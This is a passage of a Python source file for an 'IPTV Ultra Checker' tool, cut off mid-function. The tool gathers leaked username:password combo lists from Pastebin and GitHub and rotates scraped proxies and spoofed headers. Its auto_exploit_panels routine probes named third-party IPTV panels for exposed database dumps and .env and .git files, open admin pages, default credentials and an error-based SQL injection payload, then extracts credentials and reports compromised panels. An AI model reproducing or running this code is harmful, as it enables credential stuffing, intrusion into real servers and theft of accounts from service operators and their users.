#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=========================================================================
   🇩🇿🇩🇿 IPTV ULTRA CHECKER AISSA_TOUMI 🇩🇿🇩🇿  -  v7.3.6
   FULLY INTEGRATED & UPDATED PASTEBIN RAW LINKS
   ---------------------------------------------------------------------
   v7.3.6 (counts fix):
     [FIX] COUNT_TIMEOUT=(6.0,12.0), COUNT_RETRIES=3 -> real live/vod/series
     [FIX] _fetch_counts serial + 0.3s gap (no parallel rejection)
     [FIX] extra response keys: streams, items, available_channels, data
     [FIX] counts cache per (host,user) to skip slow re-fetch
     [FIX] counts_reason recorded instead of silent '?'
   ---------------------------------------------------------------------
   v7.3.5:
     [NEW] Quiet/background mode: --quiet, no auto-open, file-only logs.
     [NEW] Speed: DEFAULT_THREADS=150, MAX_THREADS=1000, BULK_SEM=6.
     [NEW] Tight timeouts: REQ=(2,4), COUNT=(1.5,3), retries=1.
     [NEW] _adaptive_timeout: fast (1,2), normal (2,4), slow (2.5,5).
     [NEW] UI BOTS SPEED default = 150.
     [KEPT] v7.3.4: M3U toggle, encryption, JSONL/CSV, SQLite, no size cap.
     [KEPT] Proxy generation/testing untouched.
=========================================================================
"""

import os, sys, re, json, time, signal, socket, ssl, threading, datetime
import logging, random, argparse, subprocess, webbrowser, urllib.parse
import collections, itertools, math, sqlite3, queue, csv
from logging.handlers import RotatingFileHandler
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

def _pip_install(packages):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet"] + packages,
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception: return False

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
except ImportError:
    if _pip_install(["requests"]):
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
    else: sys.exit(1)
logging.captureWarnings(True)

try:
    from bs4 import BeautifulSoup; HAS_BS4 = True
except ImportError:
    HAS_BS4 = _pip_install(["beautifulsoup4"])
    if HAS_BS4:
        try: from bs4 import BeautifulSoup
        except ImportError: HAS_BS4 = False

try:
    import socks; HAS_SOCKS = True
except ImportError: HAS_SOCKS = False

try:
    from cryptography.fernet import Fernet, InvalidToken
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = _pip_install(["cryptography"])
    if HAS_CRYPTO:
        try: from cryptography.fernet import Fernet, InvalidToken
        except ImportError: HAS_CRYPTO = False

TOOL_NAME = "IPTV ULTRA CHECKER"
TOOL_AUTHOR = "AISSA_TOUMI"
TOOL_VERSION = "7.3.6"

VERIFY_SSL = True; INSECURE_MODE = False
DEFAULT_THREADS = 150; MAX_THREADS = 1000
DEFAULT_TIMEOUT = 5
REQ_TIMEOUT = (2.0, 4.0)
# v7.3.6: counts need longer timeouts and more retries
COUNT_TIMEOUT = (6.0, 12.0)
COUNT_RETRIES = 3
COUNT_GAP = 0.3
MAX_CREDS_PER_RUN = None  # no limit
ENABLE_M3U_FALLBACK = False  # toggle via UI
BULK_SEM = threading.Semaphore(6)
ALIVE_CACHE_FILE = "alive_proxies.txt"
DB_FILE = "harvested_combos.db"
FETCHED_FILE = "fetched_combos.txt"
HITS_JSONL = "hits.jsonl"
HITS_CSV = "hits.csv"
KEY_FILE = "key.bin"
STOP_EVENT = threading.Event()
QUIET = False
BG_FILE_CANDIDATES = ["background.jpg","background.jpeg","background.png","background.webp"]

PROXY_TCP_TIMEOUT=1.5; PROXY_TCP_THREADS=3000
PROXY_HTTP_TIMEOUT=6;  PROXY_HTTP_THREADS=2000

ADAPT_START = 50; ADAPT_MIN = 10; ADAPT_MAX = 500
ADAPT_COMBO_START = 20; ADAPT_COMBO_MIN = 5; ADAPT_COMBO_MAX = 200
CHECKPOINT_EVERY = 1000

UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
]
DEFAULT_HEADERS = {
    "User-Agent": UA_POOL[0],
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}
def _rand_headers():
    h = dict(DEFAULT_HEADERS)
    h["User-Agent"] = random.choice(UA_POOL)
    h["Accept-Language"] = random.choice([
        "en-US,en;q=0.9", "ar,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
        "es-ES,es;q=0.9,en;q=0.8", "de-DE,de;q=0.9,en;q=0.8",
    ])
    h["Sec-Fetch-Dest"] = "empty"
    h["Sec-Fetch-Mode"] = "cors"
    h["Sec-Fetch-Site"] = "same-origin"
    h["Referer"] = random.choice([
        "http://example.com/", "https://example.com/", "http://localhost/",
    ])
    return h

logger = logging.getLogger("ultra_checker"); logger.setLevel(logging.INFO)
_fh = RotatingFileHandler("ultra_checker.log", maxBytes=10*1024*1024,
                          backupCount=5, encoding="utf-8")
_fh.setFormatter(logging.Formatter("%(asctime)s | %(levelname)-7s | %(threadName)s | %(message)s"))
logger.addHandler(_fh)
_ch = None
if not QUIET:
    _ch = logging.StreamHandler()
    _ch.setFormatter(logging.Formatter("%(asctime)s | %(levelname)-7s | %(message)s"))
    logger.addHandler(_ch)
def log_exc(tag, exc, ctx=""):
    logger.exception(f"{tag} | ctx={ctx} | {type(exc).__name__}: {exc}")

_FERNET = None
def _init_crypto():
    global _FERNET
    if not HAS_CRYPTO:
        logger.warning("cryptography not installed; storage will be plaintext")
        return
    key = os.environ.get("AISSA_KEY")
    if key:
        try:
            kb = key.encode() if isinstance(key, str) else key
            _FERNET = Fernet(kb)
            return
        except Exception as e:
            log_exc("crypto_env", e)
    if os.path.isfile(KEY_FILE):
        try:
            with open(KEY_FILE, "rb") as f:
                _FERNET = Fernet(f.read().strip())
            try: os.chmod(KEY_FILE, 0o600)
            except OSError: pass
            return
        except Exception as e:
            log_exc("crypto_keyfile", e)
    try:
        k = Fernet.generate_key()
        with open(KEY_FILE, "wb") as f:
            f.write(k)
        try: os.chmod(KEY_FILE, 0o600)
        except OSError: pass
        _FERNET = Fernet(k)
        logger.info("Generated new key.bin")
    except Exception as e:
        log_exc("crypto_gen", e)

def _enc(s):
    if _FERNET is None: return s
    try: return _FERNET.encrypt(s.encode("utf-8")).decode("ascii")
    except Exception as e: log_exc("enc", e); return s

def _dec(s):
    if _FERNET is None: return s
    try: return _FERNET.decrypt(s.encode("ascii")).decode("utf-8")
    except (InvalidToken, Exception):
        return s

import ipaddress
def _is_internal_target(url):
    try:
        p = urllib.parse.urlparse(url)
        if p.scheme not in ("http", "https"): return True
        host = p.hostname
        if not host: return True
        if host in ("localhost", "metadata.google.internal"): return True
        try:
            ip = ipaddress.ip_address(host)
            return (ip.is_private or ip.is_loopback or ip.is_link_local
                    or ip.is_reserved or ip.is_multicast)
        except ValueError:
            pass
        return False
    except Exception:
        return True

PROXY_REGEX = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")
IPV4_CHECK  = re.compile(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$")
BAD_PORTS = {0,1,7,9,11,13,15,17,19,21,22,23,25,37,42,43,53,67,68,69,70,79,80,81,82,83,84,85,88,89,90,99,
             110,111,113,119,123,135,137,138,139,143,161,162,179,389,443,445,465,514,515,543,544,548,554,587,
             631,636,646,873,990,993,995,1025,1026,1027,1028,1029,1030,1031,1032,1033,1034,1035,1036,1037,
             1038,1039,1040,1041,1042,1043,1044,1045,1433,1434,1521,1701,1723,1755,1812,1813,1900,2049,
             2082,2083,2086,2087,2095,2096,2222,2375,2376,2483,2484,3000,3268,3269,3306,3389,3690,4000,
             4369,4444,4500,5000,5060,5061,5222,5269,5353,5432,5555,5632,5672,5900,5901,5984,6000,6379,
             6666,6667,6881,7000,7001,7002,7070,7199,7474,7547,8000,8008,8009,8443,8880,9000,9001,9042,
             9090,9092,9160,9200,9300,9443,9999,10000,11211,15672,27017,27018,50000,50070,61616}
def is_valid_ip(ip):
    m = IPV4_CHECK.match(ip)
    if not m: return False
    o = [int(g) for g in m.groups()]
    return not any(x>255 for x in o) and o[0] not in (0,127) and o[0] < 224
def port_ok(p): return 1024 <= p <= 65500 and p not in BAD_PORTS
def scheme_for(url):
    low=url.lower()
    return "socks5" if "socks5" in low else ("socks4" if "socks4" in low else "http")

PRIORITY_SOURCES = [
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
]
EXTRA_SOURCES = [
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://openproxylist.xyz/http.txt","https://openproxylist.xyz/socks4.txt","https://openproxylist.xyz/socks5.txt",
    "https://spys.me/proxy.txt","https://spys.me/socks.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://litport.net/api/free-proxy?limit=1000&format=json",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=json",
]
SOURCES = PRIORITY_SOURCES + EXTRA_SOURCES

RUNS = {}
RUNS_LOCK = threading.Lock()
def _run_state(run_id):
    with RUNS_LOCK:
        st = RUNS.get(run_id)
        if st is None:
            st = {"cancelled": False,"checkpoint": None,"progress": {},"started": time.time()}
            RUNS[run_id] = st
        return st
def _run_cancelled(run_id):
    with RUNS_LOCK:
        st = RUNS.get(run_id)
        return bool(st and st.get("cancelled"))
def _run_set_progress(run_id, **kw):
    with RUNS_LOCK:
        st = RUNS.get(run_id)
        if st is not None:
            st["progress"].update(kw)
            st["progress"]["elapsedMs"] = int((time.time() - st["started"]) * 1000)
def _run_checkpoint(run_id, data):
    with RUNS_LOCK:
        st = RUNS.get(run_id)
        if st is not None:
            st["checkpoint"] = data

class AdaptivePool:
    def __init__(self, start=ADAPT_START, floor=ADAPT_MIN, ceil=ADAPT_MAX,
                 step_up=1.25, step_down=0.5, window=2.0, up_thresh=0.95, down_thresh=0.50):
        self.pool_size = start; self.floor = floor; self.ceil = ceil
        self.step_up = step_up; self.step_down = step_down
        self.window = window; self.up_thresh = up_thresh; self.down_thresh = down_thresh
        self.ok = 0; self.fail = 0; self.last = time.time(); self.lock = threading.Lock()
    def record(self, success):
        with self.lock:
            if success: self.ok += 1
            else: self.fail += 1
            now = time.time()
            if now - self.last >= self.window:
                total = self.ok + self.fail
                if total > 0:
                    rate = self.ok / total
                    if rate >= self.up_thresh and self.pool_size < self.ceil:
                        self.pool_size = min(self.ceil, int(self.pool_size * self.step_up))
                    elif (1 - rate) >= self.down_thresh and self.pool_size > self.floor:
                        self.pool_size = max(self.floor, int(self.pool_size * self.step_down))
                self.ok = 0; self.fail = 0; self.last = now
                return True
            return False
    def size(self):
        with self.lock: return self.pool_size

def _proxy_connect_test(host, port, timeout=5.0):
    t0 = time.time()
    try:
        s = socket.create_connection((host, int(port)), timeout=timeout)
        s.settimeout(timeout)
        req = b"CONNECT httpbin.org:443 HTTP/1.1\r\nHost: httpbin.org:443\r\n\r\n"
        s.sendall(req); buf = b""
        while b"\r\n\r\n" not in buf and len(buf) < 4096:
            chunk = s.recv(2048)
            if not chunk: break
            buf += chunk
        s.close()
        latency = int((time.time() - t0) * 1000)
        if buf.startswith(b"HTTP/1.1 200") or buf.startswith(b"HTTP/1.0 200"):
            return True, latency
        return False, latency
    except Exception:
        return False, int((time.time() - t0) * 1000)

def _proxy_anonymity_test(proxy, timeout=8.0):
    if proxy.startswith("socks") and not HAS_SOCKS:
        return None
    pm = {"http": proxy, "https": proxy}
    try:
        r = requests.get("https://httpbin.org/headers", proxies=pm, timeout=timeout,
                         verify=VERIFY_SSL, allow_redirects=True)
        if r.status_code != 200: return None
        data = r.json() if "json" in r.headers.get("Content-Type", "") else {}
        headers = data.get("headers", {}) if isinstance(data, dict) else {}
        via = headers.get("Via") or headers.get("via")
        xff = headers.get("X-Forwarded-For") or headers.get("x-forwarded-for")
        origin = (headers.get("Origin") or headers.get("origin") or "").strip()
        try:
            hp = proxy.split("://", 1)[-1].split("@")[-1]
            phost = hp.rsplit(":", 1)[0]
        except Exception: phost = ""
        if not via and not xff: anonymity = "elite"
        elif origin and origin != phost: anonymity = "anonymous"
        else: anonymity = "transparent"
        return {"anonymity": anonymity, "httpsCapable": True, "origin": origin}
    except Exception:
        return None

def forge_proxy(host, port, protocol="http"):
    proxy = f"{protocol}://{host}:{port}"
    ok, latency = _proxy_connect_test(host, port, timeout=5.0)
    if not ok: return None
    anon = _proxy_anonymity_test(proxy, timeout=8.0)
    if anon is None:
        return {"host": host, "port": port, "protocol": protocol,
                "latencyMs": latency, "anonymity": "transparent",
                "httpsCapable": False, "score": 0}
    score = 0
    score += 40 if anon["anonymity"] == "elite" else (20 if anon["anonymity"] == "anonymous" else 0)
    score += 40 if latency < 800 else (20 if latency < 1500 else 0)
    score += 20 if anon["httpsCapable"] else 0
    return {"host": host, "port": port, "protocol": protocol,
            "latencyMs": latency, "anonymity": anon["anonymity"],
            "httpsCapable": anon["httpsCapable"], "score": score}

def probe_panel(url):
    base = url.rstrip("/")
    if not base.startswith("http"): base = "http://" + base
    results = []
    for path in ("/player_api.php", "/get.php"):
        try:
            r = requests.get(base + path, timeout=REQ_TIMEOUT, headers=_rand_headers(),
                             verify=VERIFY_SSL, allow_redirects=True)
            if r.status_code == 200:
                body = r.text or ""; alive = False
                if path.endswith("get.php"): alive = body.strip().startswith("#EXTM3U")
                else:
                    try: alive = isinstance(r.json(), dict)
                    except Exception: alive = False
                results.append(("alive" if alive else "unknown", path))
            elif 400 <= r.status_code < 600: results.append(("dead", path))
            else: results.append(("unknown", path))
        except Exception: results.append(("unknown", path))
    if any(s == "alive" for s, _ in results): return "alive"
    if all(s == "dead" for s, _ in results): return "dead"
    return "unknown"

def analyze_combos(lines):
    if not lines: return {"error":"empty"}
    users=[]; passes=[]; pairs=[]; invalid=0
    for line in lines:
        line=line.strip()
        if not line or ":" not in line: invalid+=1; continue
        u,p=line.split(":",1)
        if u and p: users.append(u); passes.append(p); pairs.append((u,p))
        else: invalid+=1
    if not pairs: return {"error":"no valid lines"}
    def _common_prefix(strings):
        if not strings: return ""
        s1=min(strings); s2=max(strings)
        i=0
        while i<len(s1) and i<len(s2) and s1[i]==s2[i]: i+=1
        return s1[:i]
    def _common_suffix(strings):
        return _common_prefix([s[::-1] for s in strings])[::-1]
    def _char_freq(strings):
        c=collections.Counter()
        for s in strings: c.update(s)
        return c.most_common(10)
    def _len_dist(strings):
        if not strings: return []
        c=collections.Counter(len(s) for s in strings)
        return c.most_common(10)
    def _entropy(strings):
        c=collections.Counter()
        for s in strings: c.update(s)
        total=sum(c.values()) or 1
        return -sum((v/total)*math.log2(v/total) for v in c.values())
    user_prefix=_common_prefix(users); user_suffix=_common_suffix(users)
    pass_prefix=_common_prefix(passes); pass_suffix=_common_suffix(passes)
    identical=sum(1 for u,p in pairs if u==p)
    weak=sum(1 for u,p in pairs if len(p)<6 or p.lower() in SUS_P)
    dup_users=len(users)-len(set(users))
    email_like=sum(1 for u in users if "@" in u and "." in u)
    digits_only=sum(1 for u,p in pairs if u.isdigit() or p.isdigit())
    if identical > len(pairs)*0.5: pattern="user=pass"
    elif email_like > len(pairs)*0.5: pattern="email"
    elif digits_only > len(pairs)*0.5: pattern="numeric"
    elif len(user_prefix)>=3 or len(pass_prefix)>=3: pattern="common_prefix"
    else: pattern="mixed"
    return {
        "ok": True, "total": len(pairs), "invalid": invalid,
        "user_len_dist": _len_dist(users), "pass_len_dist": _len_dist(passes),
        "user_char_freq": _char_freq(users), "pass_char_freq": _char_freq(passes),
        "user_common_prefix": user_prefix, "user_common_suffix": user_suffix,
        "pass_common_prefix": pass_prefix, "pass_common_suffix": pass_suffix,
        "user_entropy": round(_entropy(users), 2), "pass_entropy": round(_entropy(passes), 2),
        "identical_user_pass": identical,
        "weak_count": weak, "dup_users": dup_users,
        "likely_pattern": pattern,
        "sample_pairs": [{"u":u,"p":p} for u,p in pairs[:5]]
    }

def extract_credentials_logic(source_text, panel_urls, preset):
    PRESETS = {
        "colon": re.compile(r"([A-Za-z0-9_.\-]{1,64}):([^\s:]{1,64})"),
        "pipe": re.compile(r"([^|\s]{1,64})\|([^|\s]{1,64})"),
        "m3u": re.compile(r"url=http[s]?://[^/]+/(?:live/)?([^/]+)/([^/]+)/", re.IGNORECASE),
        "xtream": re.compile(r"username=([^&\s]+)&password=([^&\s]+)", re.IGNORECASE),
        "url_creds": re.compile(r"([^:\s@/]{1,64}):([^@\s/]{1,64})@([^\s/]{1,255})"),
        "pipe_triple": re.compile(r"([^|\s]{1,64})\|([^|\s]{1,64})\|([^|\s]{1,64})"),
        "html_form": re.compile(r"login[=:]\s*[\"']?([^\"'&\s]+)[\"']?.*?pass(?:word)?[=:]\s*[\"']?([^\"'&\s]+)", re.IGNORECASE),
    }
    active = [PRESETS[preset]] if preset in PRESETS else [PRESETS["colon"]]
    for name, rx in PRESETS.items():
        if name != preset and rx not in active:
            active.append(rx)
    found = []
    errors = []

    def _scan_text(text, origin):
        for rx in active:
            for m in rx.findall(text):
                if isinstance(m, tuple):
                    if len(m) >= 2:
                        u, p = m[0], m[1]
                        if u and p and len(u) >= 3 and len(p) >= 3:
                            found.append({"user": u.strip(), "pass": p.strip(), "origin": origin})

    if source_text:
        _scan_text(source_text, "text")

    for url in panel_urls:
        if _is_internal_target(url):
            errors.append({"url": url, "error": "internal_target_blocked"}); continue
        try:
            r = requests.get(url, timeout=5.0, headers=_rand_headers(), verify=VERIFY_SSL)
            if r.status_code == 200:
                _scan_text(r.text, url)
            else:
                errors.append({"url": url, "error": f"HTTP {r.status_code}"})
        except Exception as e:
            errors.append({"url": url, "error": str(e)})

    unique = {}
    for item in found:
        key = f"{item['user']}:{item['pass']}"
        if key not in unique:
            unique[key] = item
    result = list(unique.values())
    return {"credentials": result, "count": len(result), "errors": errors}

def auto_exploit_panels(panel_urls):
    extracted_creds = {}
    successful_panels = []
    LFI_PATHS = ["backup.sql", "db.sql", "users.db", "database.sql", "dump.sql", ".env",
                 "config.php~", "backup.zip", "db_backup.sql", "config.bak",
                 "wp-config.php.bak", ".git/config", ".svn/entries"]
    ADMIN_PATHS = ["/admin", "/manager", "/reseller", "/panel"]
    DEFAULT_CREDS = [("admin","admin"),("test","test"),("admin","123456"),("root","root")]

    def check_panel(base_url):
        base_url = base_url.rstrip("/")
        if not base_url.startswith("http"): base_url = "http://" + base_url
        if _is_internal_target(base_url):
            return []
        local_hits = []

        for path in LFI_PATHS:
            try:
                r = requests.get(f"{base_url}/{path}", headers=_rand_headers(),
                                 timeout=5, allow_redirects=False)
                if r.status_code == 200:
                    txt = r.text
                    if ("INSERT INTO" in txt.upper() or "CREATE TABLE" in txt.upper()
                            or "@" in txt):
                        local_hits.append({"type":"LFI","path":path,"data":txt,"src":f"lfi:{path}"})
            except requests.RequestException: pass

        for path in ADMIN_PATHS:
            try:
                r = requests.get(f"{base_url}{path}", headers=_rand_headers(),
                                 timeout=5, allow_redirects=True)
                if r.status_code == 200 and ("dashboard" in r.text.lower()
                                             or "reseller" in r.text.lower()):
                    local_hits.append({"type":"Open Admin","path":path,"data":r.text,"src":f"admin:{path}"})
            except requests.RequestException: pass

        for du, dp in DEFAULT_CREDS:
            try:
                r = requests.get(f"{base_url}/player_api.php",
                                 params={"username":du,"password":dp},
                                 headers=_rand_headers(), timeout=5)
                if r.status_code == 200:
                    try:
                        j = r.json()
                        if isinstance(j, dict) and (j.get("user_info") or {}):
                            local_hits.append({"type":"DefaultCred","path":"/player_api.php",
                                               "data":f"{du}:{dp}", "src":"default_cred"})
                    except Exception: pass
            except requests.RequestException: pass

        try:
            sqli_payload = {"username": "admin' OR '1'='1", "password": "test"}
            r = requests.get(f"{base_url}/player_api.php", params=sqli_payload,
                             headers=_rand_headers(), timeout=5)
            err_sigs = ["you have an error in your sql syntax", "warning: mysql_fetch",
                        "unclosed quotation mark"]
            if any(sig in r.text.lower() for sig in err_sigs):
                local_hits.append({"type":"SQLi Error","path":"/player_api.php",
                                   "data":r.text,"src":"sqli:error"})
        except requests.RequestException: pass

        return local_hits

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(check_panel, u): u for u in panel_urls}
        for f in as_completed(futures):
            url = futures[f]
            try:
                hits = f.result()
                if hits:
                    successful_panels.append(url)
                    for hit in hits:
                        if hit["type"] == "DefaultCred":
                            u, p = hit["data"].split(":",1)
                            extracted_creds[f"{u}:{p}"] = {"user":u,"pass":p,"source":hit["src"]}
                            continue
                        matches = re.findall(r"([a-zA-Z0-9_.\-]{3,32}):([^\s:\"']{3,32})", hit["data"])
                        for u, p in matches:
                            if not any(x in u.lower() for x in ["http","https","insert","select","table"]):
                                extracted_creds[f"{u}:{p}"] = {"user":u,"pass":p,"source":hit["src"]}
            except Exception as e: log_exc("auto_exploit", e, url)

    return {"panels_compromised": successful_panels,
            "creds": list(extracted_creds.values())}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA synchronous=NORMAL")
    c.execute('''CREATE TABLE IF NOT EXISTS combos
                 (user TEXT, pass TEXT, source TEXT, date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                 UNIQUE(user, pass))''')
    c.execute("CREATE INDEX IF NOT EXISTS idx_src ON combos(source)")
    c.execute('''CREATE TABLE IF NOT EXISTS hits
                 (host TEXT, user TEXT, pass TEXT, payload TEXT,
                  date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                  UNIQUE(host, user, pass))''')
    conn.commit()
    return conn

def save_to_db(creds_list, source_url):
    conn = init_db()
    c = conn.cursor()
    saved = 0
    for c_line in creds_list:
        try:
            u, p = c_line.split(":", 1)
            c.execute("INSERT OR IGNORE INTO combos (user, pass, source) VALUES (?, ?, ?)",
                      (_enc(u), _enc(p), source_url))
            if c.rowcount > 0: saved += 1
        except: pass
    conn.commit()
    conn.close()
    return saved

def save_hit_db(host, user, password, payload_json):
    try:
        conn = init_db()
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO hits (host, user, pass, payload) VALUES (?, ?, ?, ?)",
                  (host, _enc(user), _enc(password), _enc(payload_json)))
        conn.commit()
        conn.close()
    except Exception as e:
        log_exc("save_hit_db", e)

def is_hit_new(host, user, password):
    try:
        conn = init_db()
        c = conn.cursor()
        c.execute("SELECT 1 FROM hits WHERE host=? AND user=? AND pass=? LIMIT 1",
                  (host, _enc(user), _enc(password)))
        row = c.fetchone()
        conn.close()
        return row is None
    except Exception:
        return True

def fetch_massive_combos():
    raw_sources = [
        "https://pastebin.com/raw/BAuSk1SC",
        "https://pastebin.com/raw/1nM7Htin",
        "https://pastebin.com/raw/U0wuEjAQ",
        "https://pastebin.com/raw/YVBjE9ii",
        "https://pastebin.com/raw/3811mtUj",
        "https://pastebin.com/raw/9ybNqM79",
        "https://pastebin.com/raw/AspPx4sE",
        "https://pastebin.com/raw/WuPRYEF7",
        "https://raw.githubusercontent.com/IPTV-combolist/IPTV-Combolist/main/combo.txt",
        "https://raw.githubusercontent.com/zebzoo/IPTV-Combolist/main/combo.txt"
    ]

    all_creds = set()

    def process_text(text, origin):
        local = set()
        for match in re.findall(r"^([A-Za-z0-9_.\-]{3,32}):([^\s:\"']{3,32})$", text, re.MULTILINE):
            u, p = match
            if not any(x in u.lower() for x in ["http","https","insert","select","table","amlst","smil","ngrp","mp4","rtmp"]):
                local.add(f"{u}:{p}")
        for match in re.findall(r"username=([^&\s]+)&password=([^&\s]+)", text):
            u, p = match
            local.add(f"{u}:{p}")
        if local:
            save_to_db(local, origin)
            all_creds.update(local)

    def fetch_source(url):
        try:
            with _pool_lock:
                proxy = proxy_pool.get() if use_proxies else None
            r = requests.get(url, headers=_rand_headers(),
                             proxies=_build_proxies(proxy), timeout=10)
            if r.status_code == 200:
                process_text(r.text, url)
        except: pass

    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = [ex.submit(fetch_source, url) for url in raw_sources]
        for f in as_completed(futs): pass

    return list(all_creds)

def auto_generate_combos():
    hardcoded_panels = [
        "hosttiatro.digital:8080", "v111.co:80", "asmr4k.pro:80", "tiatro.digital:8080",
        "megatv.shop:2052", "live.lynxiptv.xyz:80", "xc.nv2.xyz:80", "marveltv.info:80",
        "arox.tv:80", "sans7.org:88", "sansatplus.net:88", "sansat.cc:88", "xlion.net:8080",
        "aromatv.co:80", "servx.pro:80", "look4k.com", "noor4k.ca:80", "maventv.one:80",
        "teslasmartv.com:2095", "teslasoon.com:8080", "falcon-sa.xyz:80", "amigo8k.vip:8080",
        "clicktv1.live:2082", "cloudott.org:80", "o99.link:2082", "Nobeltv.live:8080",
        "darpro4k.com:8080", "dana-tv.com:8080", "hydratv.cc:80", "hydra.st:80",
        "hydqw.xyz:80", "hydratv.pro:80", "sparkplay.co:80", "var8k.com:8080",
        "vod4k.cc:80", "arabstream.online:80", "123.dragonkey.net:2082", "asha.live:80",
        "fatv.vip:80", "ghost1.tv:80", "cf.business-cloud-neo.ru:80", "majestictv.info:25461",
        "nova4k.xyz:80", "dreamtv22.info:25461", "cf.exp-cdn.meu.goldeniptv.com:2052",
        "line.lanadino.space:80", "otvtv.blueiptv.live", "falcontv.top:80", "raeed.tv:80",
        "vlue.vip:80", "kingtv.net:80", "dlta4k.com:80", "sa.savpn.xyz:80", "nvpro.tv:80",
        "ziggo.pro:80", "shoftvs.com:80", "zertytv.org", "showplustv.pro:80", "forevertv.me:2095",
        "crazyiptv.vip:8080", "mhiptv.info:80", "kdmax.myddns.me:8080", "darhome.xyz:8080",
        "sts.mydroon.com:80", "almodamer.com:8080", "starshare.one:8080", "pha.tv:8080",
        "eag4k.click:80", "redfoxx.vip:80", "ninjaiptv.net:8080", "vlc.news:80", "2b2.xyz:8080",
        "teratv.online:80", "live.mypythontv.com:2052", "kingtop10.net:7070", "tesla2tv.com:8080",
        "magiclive.xyz:2052", "s1.nasaservers.com:8080", "hlaa-tv.com:80", "2mtv.net:8080",
        "leotv.xyz:80", "line.atlaspro4k.me:80", "supersonictv.live:8080", "otv4k.live:80",
        "azar2025.me:80", "shooters.live:80", "zain4k.com:8080", "sawa2025.vip:80",
        "live.gogo-iptv.com:8880", "35623218.97qaz.com:80"
    ]
    clean_panels = []
    for p in hardcoded_panels:
        p = p.strip()
